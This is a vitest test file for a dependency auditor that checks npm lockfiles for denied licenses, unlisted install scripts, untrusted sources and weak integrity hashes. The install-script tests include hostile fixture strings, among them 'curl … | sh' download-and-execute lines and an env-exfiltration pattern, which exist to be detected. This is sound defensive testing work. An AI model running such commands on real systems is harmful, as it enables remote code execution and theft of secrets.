import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import {
  packageNameFromPath,
  readLockPackages,
  classifyLicense,
  auditLicenses,
  scanScriptBody,
  readInstalledScripts,
  auditInstallScripts,
  auditSources,
  buildReport,
  runAudit,
  isFailing,
  main,
  INSTALL_SCRIPT_ALLOWLIST,
} from "../scripts/audit-deps.js";

// #540 — Supply chain security & license auditor. Runs entirely against
// temp-dir fixtures; no network and no dependency on the real lockfile.

const NPM = "https://registry.npmjs.org";
const pkg = (name, extra = {}) => ({
  version: "1.0.0",
  resolved: `${NPM}/${name}/-/${name}-1.0.0.tgz`,
  integrity: "sha512-abc",
  license: "MIT",
  ...extra,
});

let root;
const writeLock = (packages, file = "package-lock.json") => {
  const abs = path.join(root, file);
  fs.mkdirSync(path.dirname(abs), { recursive: true });
  fs.writeFileSync(abs, JSON.stringify({ lockfileVersion: 3, packages }));
};

beforeEach(() => {
  root = fs.mkdtempSync(path.join(os.tmpdir(), "audit-deps-"));
});
afterEach(() => {
  fs.rmSync(root, { recursive: true, force: true });
  vi.restoreAllMocks();
});

describe("packageNameFromPath", () => {
  it("strips node_modules prefixes, including nested and scoped", () => {
    expect(packageNameFromPath("node_modules/react")).toBe("react");
    expect(packageNameFromPath("node_modules/@a/b")).toBe("@a/b");
    expect(packageNameFromPath("node_modules/x/node_modules/y")).toBe("y");
  });
  it("returns non-node_modules paths untouched", () => {
    expect(packageNameFromPath("server")).toBe("server");
  });
});

describe("readLockPackages", () => {
  it("skips root, workspace folders and links; normalizes fields", () => {
    writeLock({
      "": { name: "root" },
      server: { name: "srv" },
      "node_modules/srv": { link: true, resolved: "server" },
      "node_modules/a": pkg("a", { dev: true, hasInstallScript: true }),
      "node_modules/b": { version: "2.0.0", license: { type: "MIT" } },
    });
    const entries = readLockPackages("package-lock.json", root);
    expect(entries.map((e) => e.name)).toEqual(["a", "b"]);
    expect(entries[0]).toMatchObject({
      dev: true,
      hasInstallScript: true,
      license: "MIT",
    });
    expect(entries[1].license).toBe("UNKNOWN");
  });

  it("defaults missing version and tolerates a lock with no packages", () => {
    writeLock({ "node_modules/a": {} });
    expect(readLockPackages("package-lock.json", root)[0].version).toBe("?");
    fs.writeFileSync(path.join(root, "empty.json"), "{}");
    expect(readLockPackages("empty.json", root)).toEqual([]);
  });
});

describe("license classification", () => {
  it("approves permissive, reviews weak copyleft, denies GPL/AGPL", () => {
    expect(classifyLicense("MIT", "node_modules/a")).toBe("approved");
    expect(classifyLicense("LGPL-3.0", "node_modules/a")).toBe("review");
    expect(classifyLicense("GPL-3.0", "node_modules/a")).toBe("denied");
    expect(classifyLicense("AGPL-3.0-only", "node_modules/a")).toBe("denied");
  });

  it("denies additional copyleft families (SSPL, EUPL, ...)", () => {
    for (const l of ["SSPL-1.0", "EUPL-1.2", "OSL-3.0", "CPAL-1.0", "RPL-1.5"])
      expect(classifyLicense(l, "node_modules/a")).toBe("denied");
  });

  it("downgrades denied to excepted only for tracked paths", () => {
    const ex = { "node_modules/legacy": "tracked" };
    expect(classifyLicense("GPL-3.0", "node_modules/legacy", ex)).toBe(
      "excepted",
    );
    expect(classifyLicense("SSPL-1.0", "node_modules/legacy", ex)).toBe(
      "excepted",
    );
    expect(classifyLicense("GPL-3.0", "node_modules/new", ex)).toBe("denied");
  });

  it("treats a missing license as needing review", () => {
    expect(classifyLicense(undefined, "node_modules/a")).toBe("review");
  });

  it("buckets entries by status", () => {
    const entries = [
      { path: "node_modules/a", license: "MIT" },
      { path: "node_modules/b", license: "GPL-3.0" },
      { path: "node_modules/c", license: "MPL-2.0" },
      { path: "node_modules/d", license: "GPL-3.0" },
    ];
    const r = auditLicenses(entries, { "node_modules/d": "tracked" });
    expect(r.approved).toHaveLength(1);
    expect(r.denied.map((e) => e.path)).toEqual(["node_modules/b"]);
    expect(r.review).toHaveLength(1);
    expect(r.excepted).toHaveLength(1);
  });
});

describe("install script scanning", () => {
  it("flags download-and-execute, eval, remote urls, base64, powershell", () => {
    expect(scanScriptBody("curl http://x.io/a.sh | sh")).toContain(
      "download-exec",
    );
    expect(scanScriptBody("node -e \"eval('1')\"")).toContain("eval");
    expect(scanScriptBody("node fetch.js https://evil.example/x")).toContain(
      "remote-url",
    );
    expect(scanScriptBody("echo aGk= | base64 -d")).toContain("base64-decode");
    expect(scanScriptBody("powershell -c x")).toContain("powershell");
    expect(scanScriptBody("node -e \"process.env.T; fetch('u')\"")).toContain(
      "env-exfil",
    );
  });

  it("passes benign build scripts", () => {
    expect(scanScriptBody("node-gyp-build")).toEqual([]);
    expect(scanScriptBody("node ./postinstall.js")).toEqual([]);
    expect(scanScriptBody("fetch https://registry.npmjs.org/x")).toEqual([]);
  });

  it("reads lifecycle hooks from installed package.json", () => {
    const dir = path.join(root, "node_modules/a");
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(
      path.join(dir, "package.json"),
      JSON.stringify({
        scripts: { postinstall: "x", test: "y", install: 5 },
      }),
    );
    const entry = { lock: "package-lock.json", path: "node_modules/a" };
    expect(readInstalledScripts(entry, root)).toEqual([
      { hook: "postinstall", body: "x" },
    ]);
  });

  it("resolves installed scripts relative to a nested lock's folder", () => {
    const dir = path.join(root, "server/node_modules/a");
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(
      path.join(dir, "package.json"),
      JSON.stringify({ scripts: { install: "z" } }),
    );
    const entry = { lock: "server/package-lock.json", path: "node_modules/a" };
    expect(readInstalledScripts(entry, root)).toEqual([
      { hook: "install", body: "z" },
    ]);
  });

  it("returns [] when the package is not installed", () => {
    expect(
      readInstalledScripts(
        { lock: "package-lock.json", path: "node_modules/x" },
        root,
      ),
    ).toEqual([]);
  });

  it("flags unlisted install-script packages, accepts allowlisted ones", () => {
    const entries = [
      {
        name: "fsevents",
        path: "node_modules/fsevents",
        hasInstallScript: true,
      },
      { name: "evil", path: "node_modules/evil", hasInstallScript: true },
      { name: "plain", path: "node_modules/plain", hasInstallScript: false },
    ];
    const f = auditInstallScripts(entries, { readScripts: () => [] });
    expect(f.map((x) => [x.name, x.kind])).toEqual([
      ["evil", "unlisted-install-script"],
    ]);
    expect("fsevents" in INSTALL_SCRIPT_ALLOWLIST).toBe(true);
  });

  it("flags suspicious script bodies even for allowlisted packages", () => {
    const entries = [
      {
        name: "fsevents",
        path: "node_modules/fsevents",
        hasInstallScript: true,
      },
    ];
    const f = auditInstallScripts(entries, {
      readScripts: () => [{ hook: "install", body: "curl x.sh | bash" }],
    });
    expect(f).toHaveLength(1);
    expect(f[0]).toMatchObject({
      kind: "suspicious-install-script",
      hook: "install",
      hits: ["download-exec"],
    });
  });

  it("uses the on-disk reader by default", () => {
    const entries = [
      {
        name: "fsevents",
        path: "node_modules/fsevents",
        lock: "nope.json",
        hasInstallScript: true,
      },
    ];
    expect(auditInstallScripts(entries)).toEqual([]);
  });
});

describe("auditSources (hijack indicators)", () => {
  const base = { path: "node_modules/a", name: "a" };
  const kinds = (e) => auditSources([{ ...base, ...e }]).map((f) => f.kind);

  it("accepts trusted https registries with sha512 integrity", () => {
    expect(
      kinds({ resolved: `${NPM}/a/-/a-1.tgz`, integrity: "sha512-x" }),
    ).toEqual([]);
    expect(
      kinds({
        resolved: "https://npm.jsr.io/~/11/a.tgz",
        integrity: "sha512-x",
      }),
    ).toEqual([]);
  });

  it("flags untrusted hosts, git/file sources and unparsable URLs", () => {
    expect(
      kinds({ resolved: "https://evil.io/a.tgz", integrity: "sha512-x" }),
    ).toEqual(["untrusted-source"]);
    expect(
      kinds({
        resolved: "git+ssh://git@github.com/x/a.git",
        integrity: "sha512-x",
      }),
    ).toEqual(["untrusted-source"]);
    expect(kinds({ resolved: "not a url", integrity: "sha512-x" })).toEqual([
      "untrusted-source",
    ]);
  });

  it("flags insecure http transport", () => {
    expect(
      kinds({
        resolved: "http://registry.npmjs.org/a.tgz",
        integrity: "sha512-x",
      }),
    ).toEqual(["insecure-transport"]);
  });

  it("flags missing and weak integrity, and missing resolved", () => {
    expect(kinds({ resolved: `${NPM}/a.tgz` })).toEqual(["missing-integrity"]);
    expect(kinds({ resolved: `${NPM}/a.tgz`, integrity: "sha1-abc" })).toEqual([
      "weak-integrity",
    ]);
    expect(kinds({})).toEqual(["missing-resolved"]);
  });
});

describe("runAudit / isFailing / buildReport", () => {
  it("passes a clean tree and builds a deterministic report", () => {
    writeLock({ "": {}, "node_modules/a": pkg("a") });
    const r = runAudit(["package-lock.json"], root);
    expect(isFailing(r)).toBe(false);
    expect(r.report.summary).toMatchObject({
      total: 1,
      approved: 1,
      denied: 0,
    });
    expect(JSON.stringify(buildReport(r.entries, r.licenses))).toBe(
      JSON.stringify(r.report),
    );
  });

  it("merges multiple lockfiles", () => {
    writeLock({ "node_modules/a": pkg("a") });
    writeLock({ "node_modules/b": pkg("b") }, "server/package-lock.json");
    const r = runAudit(["package-lock.json", "server/package-lock.json"], root);
    expect(r.entries.map((e) => e.lock)).toEqual([
      "package-lock.json",
      "server/package-lock.json",
    ]);
  });

  it("fails on new GPL, unlisted install script, or untrusted source", () => {
    writeLock({ "node_modules/g": pkg("g", { license: "GPL-3.0" }) });
    expect(isFailing(runAudit(["package-lock.json"], root))).toBe(true);
    writeLock({ "node_modules/s": pkg("s", { hasInstallScript: true }) });
    expect(isFailing(runAudit(["package-lock.json"], root))).toBe(true);
    writeLock({
      "node_modules/h": pkg("h", { resolved: "https://evil.io/h.tgz" }),
    });
    expect(isFailing(runAudit(["package-lock.json"], root))).toBe(true);
  });

  it("only fails review licenses under --strict", () => {
    writeLock({ "node_modules/m": pkg("m", { license: "MPL-2.0" }) });
    const r = runAudit(["package-lock.json"], root);
    expect(isFailing(r)).toBe(false);
    expect(isFailing(r, true)).toBe(true);
  });
});

describe("main (CLI)", () => {
  beforeEach(() => {
    vi.spyOn(console, "log").mockImplementation(() => {});
    vi.spyOn(console, "error").mockImplementation(() => {});
  });

  it("writes licenses.json and exits 0 on a clean tree", () => {
    writeLock({ "node_modules/a": pkg("a") });
    expect(main(["--lock", "package-lock.json"], root)).toBe(0);
    const report = JSON.parse(
      fs.readFileSync(path.join(root, "licenses.json"), "utf8"),
    );
    expect(report.summary.total).toBe(1);
  });

  it("honors --out and --no-write", () => {
    writeLock({ "node_modules/a": pkg("a") });
    main(["--lock", "package-lock.json", "--out", "r.json"], root);
    expect(fs.existsSync(path.join(root, "r.json"))).toBe(true);
    main(["--lock", "package-lock.json", "--no-write"], root);
    expect(fs.existsSync(path.join(root, "licenses.json"))).toBe(false);
  });

  it("--check passes when fresh and fails when stale or missing", () => {
    writeLock({ "node_modules/a": pkg("a") });
    expect(main(["--lock", "package-lock.json", "--check"], root)).toBe(1);
    main(["--lock", "package-lock.json"], root);
    expect(main(["--lock", "package-lock.json", "--check"], root)).toBe(0);
    writeLock({ "node_modules/a": pkg("a"), "node_modules/b": pkg("b") });
    expect(main(["--lock", "package-lock.json", "--check"], root)).toBe(1);
  });

  it("exits 1 and reports each finding type", () => {
    writeLock({
      "node_modules/g": pkg("g", { license: "GPL-3.0" }),
      "node_modules/s": pkg("s", { hasInstallScript: true }),
      "node_modules/h": pkg("h", { resolved: "https://evil.io/h.tgz" }),
    });
    expect(main(["--lock", "package-lock.json", "--no-write"], root)).toBe(1);
    const out = console.error.mock.calls.map((c) => c[0]).join("\n");
    expect(out).toContain("DENIED: node_modules/g@1.0.0");
    expect(out).toContain("INSTALL-SCRIPT: node_modules/s@1.0.0");
    expect(out).toContain("SOURCE: node_modules/h@1.0.0");
  });

  it("emits machine-readable output with --json", () => {
    writeLock({ "node_modules/g": pkg("g", { license: "GPL-3.0" }) });
    expect(
      main(["--lock", "package-lock.json", "--no-write", "--json"], root),
    ).toBe(1);
    const json = JSON.parse(console.log.mock.calls[0][0]);
    expect(json.denied).toEqual(["node_modules/g"]);
  });

  it("--strict fails on review licenses", () => {
    writeLock({ "node_modules/m": pkg("m", { license: "MPL-2.0" }) });
    expect(main(["--lock", "package-lock.json", "--no-write"], root)).toBe(0);
    expect(
      main(["--lock", "package-lock.json", "--no-write", "--strict"], root),
    ).toBe(1);
  });

  it("defaults to both repo lockfiles", () => {
    writeLock({ "node_modules/a": pkg("a") });
    writeLock({ "node_modules/b": pkg("b") }, "server/package-lock.json");
    expect(main(["--no-write"], root)).toBe(0);
  });
});
